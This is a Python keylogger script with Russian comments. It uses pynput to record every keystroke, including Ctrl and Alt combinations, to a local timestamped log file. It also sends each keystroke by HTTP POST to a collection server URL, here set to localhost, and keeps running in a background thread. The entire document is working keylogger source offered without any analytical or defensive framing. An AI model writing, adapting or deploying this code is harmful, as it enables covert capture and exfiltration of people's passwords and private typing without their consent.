import logging
import requests
from pynput.keyboard import Key, Listener
import os
import time
import threading

# Создаем директорию для логов (если её нет)
if not os.path.exists("keylogs"):
    os.makedirs("keylogs")

# Указываем путь к файлу логов
log_file = os.path.join("keylogs", f"keylog_{int(time.time())}.txt")

# Настраиваем логирование
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")

# URL сервера, куда отправлять данные
SERVER_URL = "http://127.0.0.1:5000/log"

# Переменные для отслеживания комбинаций клавиш
ctrl_pressed = False
alt_pressed = False

# Функция для обработки нажатий клавиш
def on_press(key):
    global ctrl_pressed, alt_pressed

    try:
        # Обработка обычных символов
        if hasattr(key, 'char'):
            if ctrl_pressed:
                log_message = f"Ctrl+{key.char} pressed"
            elif alt_pressed:
                log_message = f"Alt+{key.char} pressed"
            else:
                log_message = f"Key {key.char} pressed"
        else:
            log_message = f"Special key {key} pressed"
    except AttributeError:
        # Обработка специальных клавиш
        if key == Key.ctrl_l or key == Key.ctrl_r:
            ctrl_pressed = True
            log_message = f"Ctrl pressed"
        elif key == Key.alt_l or key == Key.alt_r:
            alt_pressed = True
            log_message = f"Alt pressed"
        else:
            log_message = f"Special key {key} pressed"

    # Логируем локально
    logging.info(log_message)

    # Отправляем на сервер
    try:
        requests.post(SERVER_URL, json={"key": log_message})
    except requests.exceptions.RequestException:
        pass  # Игнорируем ошибки, если сервер недоступен

# Функция для обработки отпускания клавиш
def on_release(key):
    global ctrl_pressed, alt_pressed

    if key == Key.ctrl_l or key == Key.ctrl_r:
        ctrl_pressed = False
    elif key == Key.alt_l or key == Key.alt_r:
        alt_pressed = False

    if key == Key.esc:
        logging.info("Escape key pressed. Exiting...")
        return False  # Останавливаем keylogger

# Запуск keylogger в отдельном потоке
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Запуск keylogger в фоновом режиме
keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.start()

# Основной цикл (для демонстрации фоновой работы)
while True:
    time.sleep(10)  # Имитация других задач